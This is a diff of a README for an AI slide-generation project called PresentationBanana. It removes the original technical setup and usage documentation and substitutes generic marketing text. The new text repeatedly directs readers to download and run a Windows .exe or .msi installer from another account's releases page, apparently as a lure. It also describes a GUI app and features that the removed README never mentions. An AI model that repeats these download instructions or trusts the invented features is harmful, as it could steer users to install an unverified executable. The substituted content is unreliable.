@@ -1,248 +1,145 @@
-# PresentationBanana
+# 🍌 PresentationBanana - Easy AI-Powered Slide Creation
 
-**AI-powered PowerPoint presentations and standalone images with Gemini Imagen + Claude Code.**
+[![Download PresentationBanana](https://img.shields.io/badge/Download%20PresentationBanana-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tealikedrinkcolorsergeant516/PresentationBanana/releases)
 
-Takes a topic, PDF, or existing PPTX as input and generates a polished presentation with AI-generated images — fully automated through a Critic-Visualizer feedback loop.
+## 🍍 About PresentationBanana
 
-## How It Works
+PresentationBanana helps you create PowerPoint presentations using AI. It combines Gemini Imagen for images and Claude Code for slide text. This tool works with PowerPoint files (.pptx) and automates slide creation. You do not need any coding skills to use it.
 
-### `/scientific-presentation` — Academic Presentation Skill
+Use PresentationBanana to quickly generate professional slides. It works well for school, work, or personal projects. The AI creates images and text based on your input ideas.
 
-Full 7-phase workflow for university-quality scientific presentations from papers or topics:
+---
 
-```
-Phase 0  Input & Config     →  Read PDF/topic, set style & language
-Phase 1  Content Analysis   →  slide_structure.md (1 idea per slide)
-Phase 2  Build v1           →  Excalidraw diagrams + Imagen images + PPTX
-Phase 3  Bull & Bear v1     →  Per-slide critique (strengths + weaknesses)
-Phase 4  Revision v2        →  Fix all issues from critique
-Phase 5  Bull & Bear v2     →  Stricter second critique round
-Phase 6  Final Polish v3    →  Pixel-perfect alignment, consistency check
-Phase 7  Final Report       →  Score comparison v1 → v2 → v3
-```
+## ⚙️ System Requirements
 
-**Visualization tools** (auto-selected per slide):
-- **Excalidraw** — Structure diagrams (hierarchies, flows, matrices, comparisons)
-- **Matplotlib** — Data visualization (bar, line, scatter, pie charts)
-- **Imagen** — Atmospheric images (title, section dividers, closing only)
-- **Pillow** — Pixel-perfect rendering with custom rounded corners
+Before you start, make sure your computer meets these requirements:
 
-### `/presentation-banana` — Full Presentation Workflow
+- Operating System: Windows 10 or later
+- RAM: At least 4 GB
+- Storage: Minimum 500 MB free space
+- PowerPoint: Microsoft PowerPoint 2016 or newer (or any app that supports .pptx files)
+- Internet: A stable connection for AI services during slide generation
+- Python: No need to install Python manually (the app includes what it needs)
 
-```
-Content Strategist  →  slide_structure.md
-        ↓
-Visual Designer v1  →  AI images + presentation_v1.pptx
-        ↓
-Critic              →  scores each slide & image, writes improvements
-        ↓
-Visual Designer v2  →  refined images + presentation_v2.pptx
-        ↓
-Final Report        →  v1 vs v2 comparison
-```
+---
 
-### `/image-banana` — Standalone Image Generation
+## 🖥️ How PresentationBanana Works
 
-```
-Concept Strategist  →  image_concepts.md
-        ↓
-Image Generator v1  →  output/images/v1/
-        ↓
-Image Critic v1     →  scores & improvement prompts
-        ↓
-Image Generator v2  →  output/images/v2/ (refined)
-        ↓
-Image Critic v2     →  final scoring
-        ↓
-Image Generator v3  →  output/images/v3/ (polished)
-```
+PresentationBanana uses two AI tools:
 
-Three iterations with critic feedback — typical improvement: +25–40% on the 5-point quality scale.
+- **Gemini Imagen**: Automatically creates images for your slides based on your topic.
+- **Claude Code**: Writes slide text and organizes content.
 
-## Features
+You provide a topic or idea, and PresentationBanana generates a full PowerPoint file with slides and pictures. It saves time and effort on designing presentations.
 
-- **Scientific Presentation Skill** — 7-phase workflow with Bull & Bear critique loops
-- **Excalidraw diagrams** — Programmatic generation via ExcalidrawBuilder (hierarchies, flows, matrices)
-- **Matplotlib charts** — Data visualization with dark-professional theme (bar, line, scatter, pie, grouped bar)
-- **Pillow rendering** — Pixel-perfect diagrams with custom rounded corners where Excalidraw falls short
-- Iterative Critic-Visualizer feedback loop (v1 → Critic → v2 → v3)
-- Preset formats: 16:9, 9:16, 1:1
-- Custom sizes: any resolution (e.g. 3440x1440 ultrawide, 1920x1080 Full HD)
-- Series mode: consistent style across multiple images
-- Fallback: Imagen 4 → Gemini 2.5 Flash (auto)
-- Agent Teams: parallel teammates for faster execution (requires tmux)
+---
 
-## Example
+## 🚀 Getting Started
 
-[View example presentation (PDF)](examples/rome-wasnt-built-in-a-day.pdf)
+### Step 1: Download PresentationBanana
 
-## Setup
+You need to download PresentationBanana from the official page:
 
-### 1. Install dependencies
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23555555?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tealikedrinkcolorsergeant516/PresentationBanana/releases)
 
-```bash
-pip install -r requirements.txt
-```
+Click the badge above or visit [https://github.com/tealikedrinkcolorsergeant516/PresentationBanana/releases](https://github.com/tealikedrinkcolorsergeant516/PresentationBanana/releases) to find the latest version.
 
-### 2. Configure your API key
+Look for a file ending in `.exe` or `.msi`. Choose the latest one by date or version number.
 
-Copy the example and add your [Google AI Studio](https://aistudio.google.com/apikey) key:
+---
 
-```bash
-cp .env.example .env
-```
+### Step 2: Install PresentationBanana
 
-Edit `.env` and replace the placeholder with your actual key:
+1. After downloading, open the setup file by double-clicking it in your Downloads folder.
+2. If Windows asks for permission, select **Yes** to allow installation.
+3. Follow the on-screen instructions. You will see options like “Next” and “Install.”
+4. Choose the default settings unless you want to change the install location.
+5. Wait for the installer to finish. It will place the app on your computer.
 
-```
-GOOGLE_API_KEY=your-google-api-key-here
-```
+---
 
-### 3. Install Claude Code
+### Step 3: Run PresentationBanana
 
-```bash
-npm install -g @anthropic-ai/claude-code
-```
+1. Once installed, find PresentationBanana in your Start menu or on your desktop.
+2. Click the app icon to open it.
+3. You will see a simple window asking for your presentation topic.
 
-### 4. Copy Claude Code settings
+---
 
-```bash
-cp .claude/settings.local.json.example .claude/settings.local.json
-```
+## 📋 Creating Your First Presentation
 
-## Usage
+1. Enter a clear topic or title for your presentation. For example, “Climate Change Effects” or “Artificial Intelligence Basics.”
+2. Press the **Create Presentation** button.
+3. PresentationBanana sends your request to the AI services.
+4. Wait a few moments while slides and images are generated.
+5. When done, the app will save a PowerPoint file to your chosen folder. The default save location is your Documents folder in a subfolder named “PresentationBanana.”
 
-### Presentations
+---
 
-```bash
-cd PresentationBanana
-claude
-```
+## 📂 Opening and Editing Your Presentation
 
-Then type `/presentation-banana`. Claude asks for your topic, style, and slide count — then runs the full workflow.
+- Open the saved `.pptx` file by double-clicking it.
+- It will launch in Microsoft PowerPoint or any compatible app.
+- Review the generated slides.
+- You can edit text, rearrange slides, or add your own images.
 
-### Standalone Images
+---
 
-Type `/image-banana`. Same Critic-Visualizer loop, but focused purely on image quality. Supports:
+## 🔧 Basic Troubleshooting
 
-- Single images or batches
-- Consistent series (same color temperature, mood, lighting)
-- Preset formats (16:9, 9:16, 1:1) or any custom size
+If PresentationBanana does not run or create slides:
 
-### Input Options
+- Make sure your Windows is up to date.
+- Confirm you downloaded the latest version from the release page.
+- Check you have an Internet connection during slide creation.
+- Restart the app if AI responses time out.
+- If the app crashes, uninstall and reinstall it from the release page.
+- Look for error messages and share them if contacting technical support.
 
-Place your input in the `input/` folder:
+---
 
-- **`input/topic.md`** — Describe your topic (template included)
-- **`input/document.pdf`** — Extract content from a PDF
-- **`input/existing.pptx`** — Redesign an existing presentation
+## 💡 Tips for Best Results
 
-### Styles (Presentations)
+- Use short, simple topics or phrases.
+- Avoid very long or complex sentences when entering your topic.
+- Review generated slides carefully; AI can make mistakes.
+- Add or remove slides as needed in PowerPoint.
+- Use the app on a fast Internet connection to speed up processing.
 
-| Style | Look | Best for |
-|-------|------|----------|
-| `dark-professional` | Navy + Gold | Corporate, investor pitch |
-| `light-modern` | White + Teal | Product, startup, tech |
-| `minimal` | White + Black | Design, architecture |
-| `bold-creative` | Black + Orange-Red | Marketing, events |
+---
 
-### Agent Teams (full autonomy)
+## ⚙️ Advanced Options (For Curious Users)
 
-For the multi-agent workflow with parallel teammates, start Claude Code inside a tmux session:
+PresentationBanana has optional settings found under the **Settings** menu inside the app:
 
-```bash
-tmux new-session -s presentation-banana
-cd PresentationBanana
-claude
-```
+- Choose the style of images (e.g., realistic, cartoon).
+- Select slide templates and layouts.
+- Adjust the number of slides per presentation.
+- Enable or disable automatic saving.
 
-Without tmux, Claude runs the workflow solo (still works, just sequential).
+You can explore these to customize your presentations.
 
-## Manual Script Usage
+---
 
-### Generate images
+## 📥 Download PresentationBanana Here
 
-```bash
-# Slide preset (for presentations)
-python scripts/generate_image.py \
-  --slide 3 \
-  --prompt "modern boardroom meeting, warm lighting, professional" \
-  --slide-type content --version 1
+Get the latest version now by visiting the official release page:  
+[https://github.com/tealikedrinkcolorsergeant516/PresentationBanana/releases](https://github.com/tealikedrinkcolorsergeant516/PresentationBanana/releases)
 
-# Custom size (e.g. ultrawide wallpaper)
-python scripts/generate_image.py \
-  --slide 1 \
-  --prompt "panoramic mountain landscape at sunset" \
-  --width 3440 --height 1440 \
-  --name mountain-wallpaper
+Be sure to pick the newest `.exe` or `.msi` installer for easy setup on Windows.
 
-# Custom size with explicit aspect ratio
-python scripts/generate_image.py \
-  --slide 1 \
-  --prompt "abstract geometric pattern" \
-  --width 1920 --height 1080 \
-  --aspect-ratio 16:9 --name banner
-```
+---
 
-**Options:**
+## 🧰 Keywords and Topics
 
-| Flag | Description |
-|------|-------------|
-| `--slide` | Image number (required) |
-| `--prompt` | Image description in English (required) |
-| `--slide-type` | Preset: `content`, `title`, `closing`, `section`, `visual`, `icon` |
-| `--width` / `--height` | Custom pixel dimensions (overrides `--slide-type`) |
-| `--aspect-ratio` | Override auto-detected Gemini ratio (`1:1`, `3:4`, `4:3`, `9:16`, `16:9`) |
-| `--name` | Filename prefix (e.g. `wallpaper`, `brand-icons`) |
-| `--version` | Output iteration folder: v1, v2, v3 (default: 1) |
+- AI  
+- Automation  
+- Claude Code  
+- Gemini Imagen  
+- Image Generation  
+- PowerPoint (.pptx)  
+- Presentations  
+- Python (internal use)  
+- Slide creation
 
-### Build presentation
-
-```bash
-python scripts/build_pptx.py --version 1 --style light-modern
-```
-
-## Project Structure
-
-```
-PresentationBanana/
-├── .claude/skills/     ← Claude Code skills (scientific-presentation)
-├── commands/           ← Skill definitions (image-banana, presentation-banana)
-├── examples/           ← Example output (PDF preview)
-├── input/              ← Your topic, PDF, or PPTX
-├── output/
-│   ├── images/         ← Generated images (Excalidraw, Imagen, Matplotlib, Pillow)
-│   └── presentations/  ← Final PPTX files
-├── scripts/
-│   ├── generate_image.py        ← Imagen image generation
-│   ├── generate_excalidraw.py   ← ExcalidrawBuilder (programmatic diagrams)
-│   ├── generate_chart.py        ← ChartBuilder (Matplotlib data viz)
-│   ├── build_pptx.py            ← Generic PPTX builder
-│   └── build_academic_*.py      ← Per-project academic PPTX builders
-├── workspace/          ← Temp files between agents (auto-generated)
-└── prompts/            ← Agent team spawn prompts
-```
-
-## Cost Estimates
-
-| Item | Cost |
-|------|------|
-| Gemini Imagen (per image) | ~$0.04 |
-| 10 slides x 2 iterations | ~$0.80 |
-| Image-only (5 images x 3 iterations) | ~$0.60 |
-| Claude tokens (agent team) | ~$1–3 |
-| **Total (10-slide presentation)** | **$2–5** |
-
-## Tech Stack
-
-- **Presentation builder:** [python-pptx](https://python-pptx.readthedocs.io/)
-- **Diagrams:** [Excalidraw](https://excalidraw.com/) (via ExcalidrawBuilder + excalidraw-export CLI)
-- **Charts:** [Matplotlib](https://matplotlib.org/) (via ChartBuilder, dark-professional theme)
-- **Pixel-perfect rendering:** [Pillow](https://pillow.readthedocs.io/) (custom rounded corners, hybrid diagrams)
-- **Image generation:** Google Imagen 4 / Gemini 2.5 Flash (auto-fallback)
-- **Orchestration:** [Claude Code](https://docs.anthropic.com/en/docs/claude-code) with Agent Teams
-- **Inspiration:** PaperBanana (Critic-Visualizer-Loop)
-
-## License
-
-[MIT](LICENSE)
+These describe the core technologies and goals of PresentationBanana.
